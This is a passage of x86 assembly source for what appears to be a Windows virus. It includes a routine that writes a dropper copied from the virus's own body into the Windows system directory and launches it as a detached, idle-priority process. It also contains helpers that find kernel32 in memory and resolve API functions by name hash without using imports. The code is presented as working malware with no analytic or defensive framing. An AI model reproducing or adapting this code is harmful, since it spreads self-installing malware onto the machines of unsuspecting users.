
; void ring3main()

; used to scan kernel for exports,
; put dropper into windows\system directory & execute it

ring3main               proc    pascal
                        local   fname:BYTE:MAXPATH
                        local   suckendata:BYTE:128
                        pusha

                        mov_h   edi, GetSystemDirectoryA
                        call    getprocaddress
                        jz      __exit

                        push    MAXPATH
                        lea     ebx, fname
                        push    ebx
                        call    eax

                        lea     edi, fname[eax] ; eax=fname length
                        call    $+5
                        pop     esi
                        sub     esi, $-dropper_name-1
                        mov     ecx, dropper_name_size
                        cld
                        rep     movsb

                        mov_h   edi, CreateFileA
                        call    getprocaddress
                        jz      __exit

                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    CREATE_ALWAYS
                        push    0
                        push    FILE_SHARE_READ
                        push    GENERIC_READ + GENERIC_WRITE
                        lea     ebx, fname
                        push    ebx
                        call    eax

                        inc     eax
                        jz      __exit
                        dec     eax

                        xchg    ebx, eax

                        mov_h   edi, WriteFile
                        call    getprocaddress
                        jz      __exit

                        xchg    esi, eax

                        push    0
                        push    esp
                        push    512
                        call    $+5
                        sub     dword ptr [esp], $-start
                        push    ebx
                        call    esi

                        push    0
                        push    esp
                        push    dropper_size
                        call    $+5
                        sub     dword ptr [esp], $-start
                        push    ebx
                        call    esi

                        mov_h   edi, CloseHandle
                        call    getprocaddress
                        jz      __exit

                        push    ebx
                        call    eax

                        mov_h   edi, CreateProcessA
                        call    getprocaddress
                        jz      __exit

                        lea     edx, suckendata
                        xor     ecx, ecx
                        mov     [edx], ecx

                        push    edx             ; lpProcessInformation
                        push    edx             ; lpStartupInfo
                        push    ecx             ; lpCurrentDirectory
                        push    ecx             ; lpEnvironment
                        push    IDLE_PRIORITY_CLASS+DETACHED_PROCESS ; dwCreationFlags
                        push    ecx             ; bInheritHandles
                        push    ecx             ; lpThreadAttributes
                        push    ecx             ; lpProcessAttributes
                        push    ecx             ; lpCommandLine
                        lea     ebx, fname
                        push    ebx             ; lpApplicationName
                        call    eax

__exit:                 popa
                        ret
                        endp

; subroutine: getprocaddress
; input:      EDI=hash
; output:     ZF,EAX=proc

getprocaddress:         pusha
                        call    get_base_ebp
                        mov     ebx, old_eip x
                        call    __scan_imgbase          ; EBX <-- PE imagebase
                        mov     ecx, [ebx].mz_neptr     ; ECX <-- importtable
                        mov     ecx, [ebx+ecx].pe_importtablerva
                        sub     ecx, size im_struct
__cycle:                add     ecx, size im_struct
                        mov     eax, [ebx+ecx].im_namerva
                        or      eax, eax
                        jz      __exit
                        mov     eax, [ebx+eax]
                        or      eax, 20202020h
                        neg     eax
                        cmp     eax, -'nrek'
                        jne     __cycle
                        mov     ecx, [ebx+ecx].im_addresstablerva ; adrtbl
                        mov     ebx, [ebx+ecx]          ; any proc in 1st lib
                        call    __scan_imgbase          ; EBX <-- PE imagebase
                        ; no EBX=imagebase of 1st library in imports,
                        ; we hope it is KERNEL32.DLL ;-)
                        mov     ecx, [ebx].mz_neptr     ; ECX <-- export
                        mov     ecx, [ebx+ecx].pe_exporttablerva
                        add     ecx, ebx
                        call    findfunc
__exit:                 mov     [esp+7*4], eax
                        or      eax, eax
                        popa
                        ret

__scan_imgbase:         xor     bx, bx
                        add     ebx, 65536
__scan_1:               sub     ebx, 65536
                        cmp     [ebx].mz_id, 'ZM'
                        jne     __scan_1
                        retn

; find function's address in export table
;
; input:  EBX=imagebase va, ECX=export table va, EDI=name csum
; modify: EDX, ESI
; output: ZF=1, EAX=0 (function not found)
;         ZF=0, EAX=function va

findfunc:               xor     esi, esi        ; current index
__search_cycle:         lea     edx, [esi*4+ebx]
                        add     edx, [ecx].ex_namepointersrva
                        mov     edx, [edx]      ; name va
                        add     edx, ebx        ; +imagebase
                        xor     eax, eax        ; calculate hash
__calc_hash:            rol     eax, 7
                        xor     al, [edx]
                        inc     edx
                        cmp     byte ptr [edx], 0
                        jne     __calc_hash
                        cmp     eax, edi        ; compare hashs
                        je      __name_found
                        inc     esi             ; index++
                        cmp     esi, [ecx].ex_numofnamepointers
                        jb      __search_cycle
                        xor     eax, eax        ; return 0
                        ret
__name_found:           mov     edx, [ecx].ex_ordinaltablerva
                        add     edx, ebx        ; +imagebase
                        movzx   edx, word ptr [edx+esi*2]; edx=current ordinal
;                       sub     edx, [ecx].ex_ordinalbase  ; -ordinal base
                        mov     eax, [ecx].ex_addresstablerva
                        add     eax, ebx        ; +imagebase
                        mov     eax, [eax+edx*4]; eax=current address
                        add     eax, ebx        ; +imagebase
                        retn                    ; return address
